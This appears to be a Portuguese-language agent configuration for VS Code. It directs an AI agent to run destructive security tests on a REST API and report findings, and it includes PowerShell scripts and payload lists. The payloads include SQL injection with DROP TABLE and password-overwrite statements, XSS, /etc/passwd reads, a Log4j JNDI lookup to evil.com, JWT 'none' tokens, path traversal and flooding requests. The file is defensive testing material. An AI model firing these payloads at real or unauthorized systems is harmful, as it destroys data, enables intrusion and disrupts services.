---
name: "testes_destrutivos_api"
description: "Execução de testes destrutivos de API para encontrar fraquezas, pontos de falhas e descobrir vulnerabilidades"

tools:
  ['vscode', 'execute', 'read', 'edit', 'search', 'web', 'pylance-mcp-server/*', 'memory/*', 'sequential-thinking/*', 'agent', 'playwright/*','ms-python.python/getPythonEnvironmentInfo', 'ms-python.python/getPythonExecutableCommand', 'ms-python.python/installPythonPackage', 'ms-python.python/configurePythonEnvironment', 'todo']
---

# 💣 Agent de Testes Destrutivos de API

## 📋 Objetivo

Execute **testes destrutivos de API** para encontrar fraquezas, pontos de falhas e descobrir como a API REST se comporta sob condições adversas, entradas malformadas e ataques diretos. O agente permite escolher entre execução via Swagger UI (com evidências visuais) ou chamadas diretas à API.

**⚠️ AVISO CRÍTICO:**
- **APENAS AMBIENTE DE TESTE**: Nunca execute em produção

## 🎯 O que este Agent Testa

Este agent executa testes destrutivos específicos para identificar vulnerabilidades comuns em APIs REST:

• **Body com estrutura JSON incorreta**
• **Tipagem incorreta de dados**
• **Valores fora os permitidos para a entidade**
• **URIs muito grandes**
• **Content-type incorretos**
• **Headers com valores grandes demais**
• **Acentuações**
• **Métodos, URI e protocolos não permitidos**

Esses testes são organizados em 7 categorias estruturadas de ataques destrutivos para garantir cobertura completa de vulnerabilidades.

**🔄 DUAS ABORDAGENS DISPONÍVEIS:**

### 🌐 **Opção 1: Com Swagger UI** (Recomendado)
- **USAR QUANDO:** API possui interface Swagger/OpenAPI disponível
- **COMO:** Playwright MCP interage com interface visual do Swagger
- **VANTAGENS:** Screenshots automáticos, evidências visuais, reprodução de falhas
- **OBRIGATÓRIO:** Habilitar servidor MCP antes de iniciar

### 🔗 **Opção 2: Chamadas Diretas à API** (Universal)
- **USAR QUANDO:** API não possui Swagger UI ou Swagger inacessível
- **COMO:** Chamadas HTTP diretas usando PowerShell/cURL
- **VANTAGENS:** Não depende de interface, funciona com qualquer API REST
- **REQUISITOS:** URL base da API e endpoints conhecidos

---

## 💀 Categorias de Testes Destrutivos

### 1. **💀 Injeção de Código (Code Injection)**
Detectar vulnerabilidades de injeção que podem comprometer a segurança do sistema.

#### Tipos de Injeção Testados:
- **SQL Injection**
  - `'; DROP TABLE users; --`
  - `1 OR 1=1`
  - `UNION SELECT password FROM users`
  - `'; UPDATE users SET password='hacked' WHERE id=1; --`

- **XSS (Cross-Site Scripting)**
  - `<script>alert('XSS')</script>`
  - `javascript:alert(document.cookie)`
  - `<img src="x" onerror="alert('XSS')">`
  - `<svg onload="alert('XSS')">`

- **Command Injection**
  - `; ls -la`
  - `| cat /etc/passwd`
  - `$(whoami)`
  - `& dir`

- **JSON Injection**
  - `{"$where": "function() { return true; }"}`
  - `{"$eval": "db.collection.drop()"}`
  - `{"__proto__": {"isAdmin": true}}`

### 2. **🔧 Malformação de Dados (Data Corruption)**
Testar robustez do parser e tratamento de dados corrompidos.

#### Estruturas Malformadas:
- **JSON Inválido**
  ```json
  {broken json}
  {"incomplete":
  {"valid": "data", extra: "unquoted"}
  null quando object esperado
  ```

- **XML Malformado**
  ```xml
  <unclosed><tag>
  <tag></different_tag>
  <!-- Bilhões de tags aninhadas (XML bomb) -->
  ```

- **Encoding Incorreto**
  - ISO-8859-1 quando UTF-8 esperado
  - ASCII quando Unicode necessário
  - Base64 corrompido
  - URL encoding malformado (`%ZZ`)

- **Content-Type Incorreto**
  - Enviar XML com `application/json`
  - Enviar HTML com `text/plain`
  - Multipart sem boundary
  - Charset incorreto

### 3. **📊 Boundary Testing (Testes Limite)**
Descobrir limites do sistema e comportamento em valores extremos.

#### Valores Extremos:
- **Numéricos**
  - `Integer.MAX_VALUE` (2147483647)
  - `Long.MAX_VALUE` (9223372036854775807)
  - Números negativos quando positivos esperados
  - Zero quando não permitido
  - Infinito e NaN
  - Decimais com 100+ casas

- **Strings Longas**
  - 1MB de texto contínuo
  - URLs de 2MB+
  - Arrays com 1 milhão de caracteres
  - Strings vazias quando obrigatórias

- **Arrays Gigantes**
  - 1 milhão de elementos
  - Arrays vazios quando não permitido
  - Arrays aninhados em 1000+ níveis
  - Objetos circulares (referência própria)

### 4. **🔐 Bypass de Autenticação (Auth Bypass)**
Testar falhas de autenticação e autorização.

#### Cenários de Bypass:
- **Tokens Malformados**
  - JWT sem assinatura
  - JWT com algoritmo "none"
  - Tokens expirados há anos
  - Headers JWT corrompidos
  - `Authorization: Bearer`
  - `Authorization: null`

- **Escalação de Privilégios**
  - User tentando acessar admin endpoints
  - Modificar claims JWT para admin
  - Reusar tokens de outros usuários
  - Session fixation attacks

- **Headers de Autenticação**
  ```
  Authorization: Bearer fake-token
  Authorization: Basic invalid-base64
  X-API-Key: ../../etc/passwd
  X-User-ID: 0
  X-Admin: true
  ```

### 5. **⚡ Sobrecarga (Overload Testing)**
Testar limites de processamento e detecção de DoS.

#### Técnicas de Sobrecarga:
- **Payload Gigante**
  - JSON de 100MB+ quando limite é 1MB
  - Strings de 1GB
  - Base64 de arquivos enormes
  - Imagens de 500MB em uploads

- **Estruturas Complexas**
  - Objetos aninhados em 10000+ níveis
  - Arrays multidimensionais
  - JSON com 1 milhão de propriedades
  - XML com bilhões de elementos (billion laughs)

- **Concorrência**
  - 1000 requisições simultâneas
  - Rate limiting bypass
  - Connection flooding
  - Memory exhaustion attacks

### 6. **🎭 Fuzzing (Character Fuzzing)**
Testar processamento de caracteres especiais e encoding.

#### Caracteres Problemáticos:
- **Unicode e Internacional**
  ```
  aéèêëçñü
  мониторинγ
  العربية
  中文测试
  🎭💥🔥💀
  ```

- **Caracteres de Controle**
  ```
  \x00 (null byte)
  \x0A (newline)
  \x0D (carriage return)
  \x1B (escape)
  \x7F (delete)
  ```

- **Caracteres Especiais**
  ```
  %20 +&=/?#[]@!$'()*,;:
  "' \|<>{}^`~
  ../../etc/passwd
  ${jndi:ldap://evil.com}
  ```

- **Direção de Texto**
  ```
  ‏עברית (RTL)‏
  ‫العربية (RTL)‫
  \u202E (reverse text)
  ```

### 7. **🚫 Métodos, URI e Protocolos Não Permitidos**
Testar se a API aceita métodos HTTP, URIs ou protocolos que não deveria suportar.

#### Métodos HTTP Inadequados:
- **Métodos Desnecessários**
  ```http
  TRACE /api/users
  CONNECT api.example.com:443
  OPTIONS /admin/delete-all
  PATCH /read-only-data
  ```

- **Métodos Customizados**
  ```http
  HACK /api/users
  ADMIN /api/settings  
  DELETE /system/critical-data
  PURGE /cache/all
  ```

#### URIs Problemáticas:
- **Path Traversal**
  ```
  GET /api/../../../etc/passwd
  GET /api/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
  GET /api/users/../../../../windows/system32/drivers/etc/hosts
  ```

- **URIs Extremas**
  ```
  GET /api/users + URI de 10MB
  GET /api/data?param=valor repetido 1000 vezes
  GET /api/endpoint%00%0a%0d (null bytes em URI)
  ```

#### Protocolos Inadequados:
- **Protocol Downgrade**
  ```
  HTTP/1.0 em API que deveria ser HTTPS only
  HTTP/0.9 em sistemas modernos
  WebSocket em endpoints REST
  ```

- **Headers de Protocolo Maliciosos**
  ```
  X-Forwarded-Proto: gopher
  X-Original-Scheme: ftp  
  Upgrade: websocket (em endpoint não-websocket)
  ```

#### Comportamentos Esperados:
- ✅ **405 Method Not Allowed** para métodos não suportados
- ✅ **400 Bad Request** para URIs malformadas
- ✅ **426 Upgrade Required** para protocolos inadequados
- ❌ **200 OK ou execução** indica vulnerabilidade

---

## 🚀 Prompt de Execução

**Cole este prompt no chat:**

```
Execute testes destrutivos de API para encontrar vulnerabilidades e pontos de falha.



PASSO 1 - ESCOLHA DO MÉTODO DE EXECUÇÃO:
Apresente as opções disponíveis:

🌐 **Swagger UI** (Recomendado se disponível)
- Execução via Playwright MCP na interface visual
- Vantagens: Screenshots automáticos, evidências visuais, reprodução fácil
- Pré-requisito: MCP Playwright habilitado + URL do Swagger

🔗 **Chamadas Diretas à API** (Universal)
- Execução via scripts PowerShell/cURL
- Vantagens: Funciona com qualquer API, não depende de interface
- Pré-requisito: URL base da API + endpoints conhecidos

**AGUARDE** confirmação do método escolhido.

PASSO 2 - VALIDAÇÃO DE PRÉ-REQUISITOS (conforme método):

**SE SWAGGER UI:**
- **VALIDAR MCP PLAYWRIGHT HABILITADO** (servidor `playwright-destructive`)
- Se NÃO estiver habilitado: Solicitar via `Ctrl+Shift+P` → `MCP: Select Servers`
- **AGUARDAR** confirmação de habilitação

**SE CHAMADAS DIRETAS:**
- Validar PowerShell ou cURL disponível
- Confirmar conectividade base com a API (ping/teste básico)

PASSO 3 - CONFIGURAÇÃO DO ALVO:
Solicitar informações conforme método:

**SWAGGER UI:**
- URL do Swagger UI (ex: https://petstore.swagger.io)
- Credenciais de teste (se necessário)
- Endpoints específicos ou "todos"

**CHAMADAS DIRETAS:**
- URL base da API (ex: https://api.example.com)  
- Endpoints principais conhecidos
- Headers de autenticação de teste
- Documentação disponível (opcional)

PASSO 4 - EXECUÇÃO DESTRUTIVA ESTRUTURADA:
Execute TODOS os 7 tipos de testes destrutivos seguindo os procedimentos específicos:

1. 💀 **Injeção de Código** (15 min)
2. 🔧 **Malformação de Dados** (10 min) 
3. 📊 **Boundary Testing** (10 min)
4. 🔐 **Bypass de Autenticação** (15 min)
5. ⚡ **Sobrecarga** (10 min)
6. 🎭 **Fuzzing** (10 min)
7. 🚫 **Métodos e Protocolos Não Permitidos** (10 min)

Para cada categoria:
- Execute os cenários listados na documentação
- Capture evidências de falhas (screenshots se Swagger, logs se direto)
- Classifique severidade: 🔴 CRÍTICO / 🟡 ALTO / 🟢 MÉDIO / ⚪ BAIXO
- Documente reprodução (curl/PowerShell commands)

PASSO 5 - RELATÓRIO DE VULNERABILIDADES:
Gere relatório completo em: `manual_test/evidence/api/destructive-{timestamp}/`

Estrutura do relatório:
- **Resumo Executivo**: vulnerabilidades críticas encontradas
- **Matriz de Risco**: classificação por severidade e impacto
- **Evidências**: screenshots/logs de cada falha encontrada
- **Scripts de Reprodução**: comandos exatos para replicar as falhas
- **Recomendações**: correções priorizadas por criticidade
- **Timeline**: cronograma sugerido para correções

PASSO 6 - CLASSIFICAÇÃO DE ACHADOS:
Para cada vulnerabilidade encontrada:

🔴 **CRÍTICO**: 
- Exposição de dados sensíveis
- Escalação de privilégios  
- Execução de código remoto
- Bypass completo de autenticação

🟡 **ALTO**:
- Information disclosure
- DoS/sobrecarga possível
- Bypass parcial de validação
- Injeção sem execução de código

🟢 **MÉDIO**:
- Comportamento inesperado
- Erro handling inadequado
- Rate limiting ausente
- Headers de segurança faltando

⚪ **BAIXO**:
- Informações de debug expostas
- Métodos HTTP desnecessários habilitados
- Headers informativos excessivos

**IMPORTANTE**: Sempre documente o IMPACTO REAL, não apenas a existência da vulnerabilidade.
```

---

## 💀 **PROCEDIMENTOS DETALHADOS POR CATEGORIA**

### 1. **Injeção de Código (15 minutos)**

#### **🌐 Swagger UI (via MCP):**
1. **SQL Injection em Forms:**
   - Localizar campos de input no Swagger UI
   - Inserir payloads SQL: `'; DROP TABLE users; --`
   - Capturar screenshot do erro ou comportamento
   - Tentar `1 OR 1=1` em filtros de busca
   - Screenshot da resposta de dados expostos

2. **XSS em TextField:**
   - Inserir `<script>alert('XSS')</script>` em campos texto
   - Testar `<img src="x" onerror="alert('XSS')">`
   - Capturar se script executa ou é sanitizado
   - Screenshot dos alerts ou mensagens de erro

#### **🔗 Chamadas Diretas (PowerShell):**
```powershell
# SQL Injection
$maliciousData = @{
    "username" = "'; DROP TABLE users; --"
    "password" = "any"
} | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri "$baseUrl/login" -Method Post -Body $maliciousData -ContentType "application/json"
    "⚠️ SQL Injection possível - resposta: $response"
} catch {
    "✅ SQL Injection bloqueada: $($_.Exception.Message)"
}

# XSS Test
$xssPayload = @{
    "comment" = "<script>alert('XSS')</script>"
    "name" = "Test User"
} | ConvertTo-Json

$xssResponse = Invoke-RestMethod -Uri "$baseUrl/comments" -Method Post -Body $xssPayload -ContentType "application/json"
"Resposta XSS: $xssResponse"
```

**Evidências esperadas:**
- Screenshots de erros SQL ou JavaScript executando (Swagger)
- Logs de erro ou stack traces expostos (ambos)
- Dados retornados indevidamente

### 2. **Malformação de Dados (10 minutos)**

#### **🌐 Swagger UI:**
1. **JSON Malformado:**
   - Editar request body para `{broken json`
   - Submeter via interface do Swagger
   - Capturar screenshot da resposta de erro
   
2. **Content-Type Incorreto:**
   - Mudar Content-Type para `text/plain` mas enviar JSON
   - Screenshot do comportamento da API

#### **🔗 Chamadas Diretas:**
```powershell
# JSON Malformado
$brokenJson = "{broken json"
try {
    $response = Invoke-WebRequest -Uri "$baseUrl/users" -Method Post -Body $brokenJson -ContentType "application/json"
    "⚠️ JSON inválido aceito: $($response.StatusCode)"
} catch {
    "✅ JSON inválido rejeitado: $($_.Exception.Message)"
}

# Content-Type incorreto
$xmlData = "<user><name>Test</name></user>"
try {
    $response = Invoke-WebRequest -Uri "$baseUrl/users" -Method Post -Body $xmlData -ContentType "application/json"
    "⚠️ Content-Type ignorado: $($response.Content)"
} catch {
    "✅ Content-Type validado: $($_.Exception.Message)"
}
```

### 3. **Boundary Testing (10 minutos)**

#### **🌐 Swagger UI:**
1. **Strings Gigantes:**
   - Gerar string de 1MB: `"a" * 1000000`
   - Colar no campo text do Swagger UI
   - Capturar resposta (timeout/erro/sucesso)

2. **Valores Numéricos Extremos:**
   - Inserir `2147483648` (overflow de int32)
   - Testar `-999999999999999`
   - Screenshot das validações

#### **🔗 Chamadas Diretas:**
```powershell
# String gigante
$giantString = "A" * 1000000
$overloadData = @{
    "description" = $giantString
    "name" = "Test"
} | ConvertTo-Json

try {
    $response = Invoke-WebRequest -Uri "$baseUrl/items" -Method Post -Body $overloadData -ContentType "application/json" -TimeoutSec 30
    "⚠️ String gigante aceita: $($response.StatusCode)"
} catch {
    "Boundary respeitado: $($_.Exception.Message)"
}

# Valor numérico extremo
$extremeNumber = @{
    "quantity" = 2147483648  # Int32.MaxValue + 1
    "price" = -999999999999
} | ConvertTo-Json

$numResponse = Invoke-RestMethod -Uri "$baseUrl/products" -Method Post -Body $extremeNumber -ContentType "application/json"
"Resposta números extremos: $numResponse"
```

### 4. **Bypass de Autenticação (15 minutos)**

#### **🌐 Swagger UI:**
1. **Tokens Malformados:**
   - Usar Authorization dialog do Swagger
   - Inserir token malformado: `Bearer fake-token-123`
   - Tentar `Bearer` (vazio)
   - Capturar screenshots das tentativas

2. **Escalação de Privilégios:**
   - Login como user comum
   - Tentar acessar endpoints admin via Swagger UI
   - Screenshot das restrições ou bypasses

#### **🔗 Chamadas Diretas:**
```powershell
# Token malformado
$fakeHeaders = @{
    "Authorization" = "Bearer fake-token-123"
    "Accept" = "application/json"
}

try {
    $adminResponse = Invoke-RestMethod -Uri "$baseUrl/admin/users" -Headers $fakeHeaders
    "🚨 CRÍTICO: Bypass de autenticação! $adminResponse"
} catch {
    "✅ Autenticação funcionando: $($_.Exception.Message)"
}

# Escalação via headers
$escalationHeaders = @{
    "X-User-ID" = "0"  # Admin ID
    "X-Admin" = "true"
    "X-Role" = "administrator"
}

try {
    $privilegeResponse = Invoke-RestMethod -Uri "$baseUrl/users" -Headers $escalationHeaders
    "🚨 CRÍTICO: Escalação de privilégios via headers!"
} catch {
    "✅ Headers customizados ignorados corretamente"
}
```

### 5. **Sobrecarga (10 minutos)**

#### Teste de Concurrent Requests:
```powershell
# Concurrent requests
$jobs = @()
for ($i = 1; $i -le 100; $i++) {
    $jobs += Start-Job -ScriptBlock {
        param($url, $iteration)
        try {
            $response = Invoke-RestMethod -Uri "$url/users" -TimeoutSec 5
            "Request $iteration: SUCCESS"
        } catch {
            "Request $iteration: FAILED - $($_.Exception.Message)"
        }
    } -ArgumentList $baseUrl, $i
}

# Aguardar e coletar resultados
$results = $jobs | Wait-Job | Receive-Job
$successCount = ($results | Where-Object { $_ -like "*SUCCESS*" }).Count
$failureCount = ($results | Where-Object { $_ -like "*FAILED*" }).Count

"Sobrecarga - Sucesso: $successCount, Falhas: $failureCount"
if ($failureCount -eq 0) {
    "⚠️ API resistiu a 100 requisições simultâneas - testar com mais"
}
```

### 6. **Fuzzing (10 minutos)**

#### **Unicode e Caracteres Especiais:**
```powershell
# Caracteres problemáticos
$fuzzingChars = @(
    "aéèêëç",           # Acentos
    "мониторинγ",        # Cirílico/grego
    "العربية",           # Árabe
    "中文测试",            # Chinês
    "\x00\x0A\x0D",     # Control chars
    "../../etc/passwd",  # Path traversal
    "${jndi:ldap://evil.com}", # Log4j
    "🎭💥🔥💀"           # Emojis
)

foreach ($fuzzChar in $fuzzingChars) {
    $fuzzData = @{
        "name" = $fuzzChar
        "description" = "Test with: $fuzzChar"
    } | ConvertTo-Json

    try {
        $fuzzResponse = Invoke-RestMethod -Uri "$baseUrl/items" -Method Post -Body $fuzzData -ContentType "application/json; charset=utf-8"
        "✅ Caractere aceito: $fuzzChar"
    } catch {
        "⚠️ Caractere rejeitado: $fuzzChar - $($_.Exception.Message)"
    }
}
```

### 7. **Métodos e Protocolos Não Permitidos (10 minutos)**

#### **🌐 Swagger UI (via MCP):**
1. **Métodos HTTP Não Suportados:**
   - Localizar endpoint no Swagger UI
   - Tentar métodos não listados: TRACE, CONNECT, PATCH
   - Capturar screenshot se métodos inadequados são aceitos
   - Testar métodos customizados via developer tools do browser

2. **URIs Problemáticas:**
   - Editar URL no Swagger UI para incluir path traversal
   - Tentar `../../admin` nos paths de endpoint
   - Screenshot de responses que não deveriam funcionar

#### **🔗 Chamadas Diretas (PowerShell):**
```powershell
# Teste de métodos HTTP não permitidos
$forbiddenMethods = @("TRACE", "CONNECT", "PATCH", "HACK", "ADMIN", "DELETE")

foreach ($method in $forbiddenMethods) {
    try {
        $response = Invoke-WebRequest -Uri "$baseUrl/users" -Method $method -TimeoutSec 5
        "🚨 MÉIO: Método $method aceito incorretamente - Status: $($response.StatusCode)"
    } catch {
        $statusCode = $_.Exception.Response.StatusCode
        if ($statusCode -eq "MethodNotAllowed") {
            "✅ Método $method corretamente rejeitado (405)"
        } else {
            "⚠️ Método $method - Resposta inesperada: $statusCode"
        }
    }
}

# Teste de URIs com path traversal
$maliciousUris = @(
    "$baseUrl/../../../etc/passwd",
    "$baseUrl/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "$baseUrl/users../../../../windows/system32/hosts"
)

foreach ($uri in $maliciousUris) {
    try {
        $response = Invoke-WebRequest -Uri $uri -TimeoutSec 5
        "🚨 ALTO: Path traversal funcionou: $uri - Status: $($response.StatusCode)"
    } catch {
        "✅ Path traversal bloqueado: $uri"
    }
}

# Teste de protocol downgrade
try {
    # Forçar HTTP 1.0
    $headers = @{ 
        "Connection" = "close"
        "Upgrade" = "websocket" 
    }
    $response = Invoke-WebRequest -Uri $baseUrl.Replace("https://", "http://") -Headers $headers
    "🚨 MÉDIO: Protocol downgrade permitido para HTTP"
} catch {
    "✅ HTTPS enforcement funcionando"
}

# Teste de URIs extremamente longas  
$giantUri = "$baseUrl/users/" + ("A" * 10000)
try {
    $response = Invoke-WebRequest -Uri $giantUri -TimeoutSec 10
    "⚠️ URI gigante aceita: $($giantUri.Length) caracteres"
} catch {
    "✅ URI gigante rejeitada corretamente"
}
```

**Evidências esperadas:**
- Screenshots de métodos inadequados aceitos (Swagger)
- Responses de path traversal successful
- Logs de protocol downgrade permitido
- URIs extremas que deveriam ser rejeitadas

---

## 📊 **CLASSIFICAÇÃO DE VULNERABILIDADES**

### 🔴 **CRÍTICO** (Ação Imediata)
- **SQL Injection**: Acesso direto ao banco de dados
- **Escalação de Privilégios**: User acessando funções admin  
- **Authentication Bypass**: Acesso sem credenciais
- **Remote Code Execution**: Execução de comandos no servidor
- **Data Exposure**: Dados sensíveis retornados indevidamente

### 🟡 **ALTO** (Corrigir em 1 semana)
- **XSS**: Script injection em campos de entrada
- **Information Disclosure**: Stack traces ou paths expostos
- **DoS**: API para de responder com payloads específicos
- **Validation Bypass**: Inputs maliciosos aceitos sem validação
- **Weak Authentication**: Tokens previsíveis ou fracos
- **Path Traversal**: Acesso a arquivos/diretórios restritos via URI

### 🟢 **MÉDIO** (Corrigir em 1 mês)
- **Error Handling**: Mensagens genéricas ausentes
- **Rate Limiting**: Ausência de throttling
- **Headers de Segurança**: CORS, CSP, HSTS faltando
- **Logging**: Eventos de segurança não logados
- **HTTP Methods**: TRACE, OPTIONS desnecessários habilitados
- **URI Validation**: Aceita URIs malformadas ou excessivas
- **Protocol Downgrade**: Permite HTTP quando deveria ser HTTPS only

### ⚪ **BAIXO** (Corrigir quando possível)
- **Information Leakage**: Versões de software expostas
- **Debug Info**: Informações técnicas em produção
- **Unnecessary Headers**: Headers informativos excessivos
- **Default Configurations**: Configurações padrão não alteradas
- **Unnecessary Methods**: Métodos HTTP não utilizados habilitados
- **Verbose Error Messages**: Detalhes técnicos em respostas de erro

---

## 📁 **ESTRUTURA DE EVIDÊNCIAS**

### Template de Diretório:
```
manual_test/evidence/api/destructive-{timestamp}/
├── report.md                    # Relatório principal
├── screenshots/                 # Screenshots do Swagger UI (se aplicável)
│   ├── 01-sql-injection.png    
│   ├── 02-xss-payload.png      
│   └── 03-auth-bypass.png      
├── scripts/                     # Scripts de reprodução
│   ├── sql-injection-test.ps1  
│   ├── auth-bypass-test.ps1     
│   └── fuzzing-test.ps1         
├── logs/                        # Logs de erro capturados
│   ├── error-responses.json     
│   ├── stack-traces.txt         
│   └── performance-metrics.csv  
└── recommendations.md           # Recomendações de correção
```

### Template de report.md:
```markdown
# 💣 Relatório de Testes Destrutivos - API

**Data:** {timestamp}  
**Target:** {api-url}  
**Método:** {swagger/direct}  
**Tester:** {nome}  

## 🎯 Resumo Executivo

**Vulnerabilidades Encontradas:**
- 🔴 CRÍTICO: X encontradas
- 🟡 ALTO: Y encontradas  
- 🟢 MÉDIO: Z encontradas
- ⚪ BAIXO: W encontradas

**Status de Segurança:** APROVADO/REPROVADO/CONDICIONAL

## 📊 Matriz de Risco
| Categoria | Vulnerabilidades | Severidade Máxima | Status |
|-----------|------------------|-------------------|--------|
| Injeção de Código | X | CRÍTICO | ❌ |
| Malformação de Dados | Y | ALTO | ⚠️ |
| Boundary Testing | Z | MÉDIO | ✅ |
| Auth Bypass | W | CRÍTICO | ❌ |
| Sobrecarga | V | BAIXO | ✅ |
| Fuzzing | U | MÉDIO | ⚠️ |
| Métodos/Protocolos | T | MÉDIO | ⚠️ |

## 🔍 Detalhamento dos Achados
[Para cada vulnerabilidade encontrada]

### 🚨 VULN-001: SQL Injection na API de Login
**Severidade:** 🔴 CRÍTICO  
**Endpoint:** POST /api/login  
**Payload:** `'; DROP TABLE users; --`  
**Descrição:** Campo username vulnerável a SQL injection  
**Evidência:** [link para screenshot/log]  
**Reprodução:**
```bash
curl -X POST "https://api.example.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username":"'\''; DROP TABLE users; --","password":"any"}'
```
**Impacto:** Acesso total ao banco de dados, possível perda de dados  
**Recomendação:** Implementar prepared statements e validação de entrada

## 🛠️ Comandos de Reprodução
[Scripts completos para reproduzir cada vulnerabilidade]

## 📋 Recomendações Priorizadas
1. **CRÍTICO (Imediato):** Corrigir SQL injection na API de login
2. **ALTO (1 semana):** Implementar rate limiting  
3. **MÉDIO (1 mês):** Adicionar headers de segurança
```

---

## ⚡ **SCRIPTS DE AUTOMAÇÃO**

### Script PowerShell Completo:
```powershell
# destructive-api-test.ps1
param(
    [Parameter(Mandatory)]
    [string]$BaseUrl,
    
    [string]$AuthToken = "",
    [string]$OutputDir = "manual_test/evidence/api/destructive-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
)

# Criar diretório de output
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
New-Item -ItemType Directory -Path "$OutputDir/logs" -Force | Out-Null
New-Item -ItemType Directory -Path "$OutputDir/scripts" -Force | Out-Null

$logFile = "$OutputDir/logs/test-execution.log"
$resultsFile = "$OutputDir/logs/results.json"

function Write-Log {
    param($Message, $Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    Write-Host $logMessage
    Add-Content -Path $logFile -Value $logMessage
}

function Test-Endpoint {
    param($Url, $Method, $Body, $Headers, $TestName)
    
    try {
        $response = Invoke-WebRequest -Uri $Url -Method $Method -Body $Body -Headers $Headers -TimeoutSec 10
        $result = @{
            TestName = $TestName
            Status = "SUCCESS"  
            StatusCode = $response.StatusCode
            ContentLength = $response.RawContentLength
            ResponseTime = (Measure-Command { Invoke-WebRequest -Uri $Url -Method $Method -Body $Body -Headers $Headers }).TotalMilliseconds
            Content = $response.Content.Substring(0, [Math]::Min(500, $response.Content.Length))
        }
    } catch {
        $result = @{
            TestName = $TestName
            Status = "FAILED"
            Error = $_.Exception.Message
            StatusCode = if ($_.Exception.Response) { $_.Exception.Response.StatusCode } else { "N/A" }
        }
    }
    
    return $result
}

Write-Log "🚀 Iniciando testes destrutivos para: $BaseUrl"

$allResults = @()
$headers = @{ "Accept" = "application/json" }
if ($AuthToken) { $headers["Authorization"] = "Bearer $AuthToken" }

# 1. SQL Injection Tests
Write-Log "💀 Executando testes de SQL Injection..."
$sqlPayloads = @(
    "'; DROP TABLE users; --",
    "1 OR 1=1",
    "UNION SELECT password FROM users",
    "admin'--"
)

foreach ($payload in $sqlPayloads) {
    $sqlBody = @{ username = $payload; password = "test" } | ConvertTo-Json
    $result = Test-Endpoint "$BaseUrl/login" "POST" $sqlBody $headers "SQL-Injection-$($sqlPayloads.IndexOf($payload))"
    $allResults += $result
    
    if ($result.Status -eq "SUCCESS" -and $result.StatusCode -eq 200) {
        Write-Log "🚨 CRÍTICO: Possível SQL Injection com payload: $payload" "CRITICAL"
    }
}

# 2. XSS Tests
Write-Log "💀 Executando testes de XSS..."
$xssPayloads = @(
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "javascript:alert(document.cookie)",
    "<svg onload='alert(1)'>"
)

foreach ($payload in $xssPayloads) {
    $xssBody = @{ comment = $payload; name = "Test" } | ConvertTo-Json
    $result = Test-Endpoint "$BaseUrl/comments" "POST" $xssBody $headers "XSS-Test-$($xssPayloads.IndexOf($payload))"
    $allResults += $result
    
    if ($result.Content -like "*$payload*") {
        Write-Log "🚨 ALTO: Possível XSS com payload: $payload" "HIGH"
    }
}

# 3. Boundary Tests
Write-Log "📊 Executando boundary tests..."
$giantString = "A" * 100000
$boundaryBody = @{ description = $giantString; name = "BoundaryTest" } | ConvertTo-Json
$result = Test-Endpoint "$BaseUrl/items" "POST" $boundaryBody $headers "Boundary-GiantString"
$allResults += $result

# 4. Auth Bypass Tests
Write-Log "🔐 Executando testes de bypass de autenticação..."
$bypassHeaders = @{
    "X-User-ID" = "0"
    "X-Admin" = "true" 
    "Authorization" = "Bearer fake-token"
    "Accept" = "application/json"
}
$result = Test-Endpoint "$BaseUrl/admin/users" "GET" $null $bypassHeaders "Auth-Bypass-FakeToken"
$allResults += $result

if ($result.Status -eq "SUCCESS") {
    Write-Log "🚨 CRÍTICO: Bypass de autenticação detectado!" "CRITICAL"
}

# 5. Fuzzing Tests
Write-Log "🎭 Executando fuzzing tests..."
$fuzzChars = @("../../etc/passwd", "`${jndi:ldap://evil.com}", "<svg>", "мониторин", "🔥💥")

foreach ($fuzzChar in $fuzzChars) {
    $fuzzBody = @{ name = $fuzzChar; test = "fuzzing" } | ConvertTo-Json
    $result = Test-Endpoint "$BaseUrl/items" "POST" $fuzzBody $headers "Fuzzing-$([array]::IndexOf($fuzzChars, $fuzzChar))"
    $allResults += $result
}

# Salvar resultados
$allResults | ConvertTo-Json -Depth 3 | Out-File $resultsFile
Write-Log "✅ Testes concluídos. Resultados salvos em: $OutputDir"

# Gerar relatório resumido
$criticalCount = ($allResults | Where-Object { $_.Status -eq "SUCCESS" -and $_.StatusCode -eq 200 }).Count
$totalTests = $allResults.Count

Write-Log "📊 RESUMO: $criticalCount de $totalTests testes indicam possíveis vulnerabilidades"

# Gerar script de reprodução
$reproductionScript = @"
# Script de Reprodução - Testes Destrutivos
# Gerado automaticamente em $(Get-Date)

`$baseUrl = "$BaseUrl"

# Reproduzir SQL Injection mais crítica
`$sqlBody = @{ username = "'; DROP TABLE users; --"; password = "test" } | ConvertTo-Json
Invoke-RestMethod -Uri "`$baseUrl/login" -Method Post -Body `$sqlBody -ContentType "application/json"

# Reproduzir XSS mais crítico
`$xssBody = @{ comment = "<script>alert('XSS')</script>"; name = "Test" } | ConvertTo-Json  
Invoke-RestMethod -Uri "`$baseUrl/comments" -Method Post -Body `$xssBody -ContentType "application/json"

# Reproduzir Auth Bypass
`$bypassHeaders = @{ "Authorization" = "Bearer fake-token"; "X-Admin" = "true" }
Invoke-RestMethod -Uri "`$baseUrl/admin/users" -Headers `$bypassHeaders
"@

$reproductionScript | Out-File "$OutputDir/scripts/reproduction.ps1"
Write-Log "📝 Script de reprodução gerado: $OutputDir/scripts/reproduction.ps1"
```

---

## 🔧 **CONFIGURAÇÃO DO MCP PLAYWRIGHT**

### Adicionar ao .vscode/mcp.json:
```json
{
  "servers": {
    "playwright-destructive": {
      "command": "npx",
      "args": [
        "@playwright/mcp@latest",
        "--output-dir", "manual_test/evidence/api/destructive-{timestamp}",
        "--viewport-size=1366,768",
        "--browser=chromium"
      ],
      "env": {
        "DESTRUCTIVE_MODE": "true",
        "EVIDENCE_TYPE": "destructive-testing",
        "AUTO_SCREENSHOT": "true"
      }
    }
  }
}
```

---

**⚠️ DISCLAIMERS FINAIS:**

1. **USO RESPONSÁVEL**: Use apenas em APIs de teste com autorização explícita
2. **BACKUP OBRIGATÓRIO**: Sempre tenha backup antes de executar
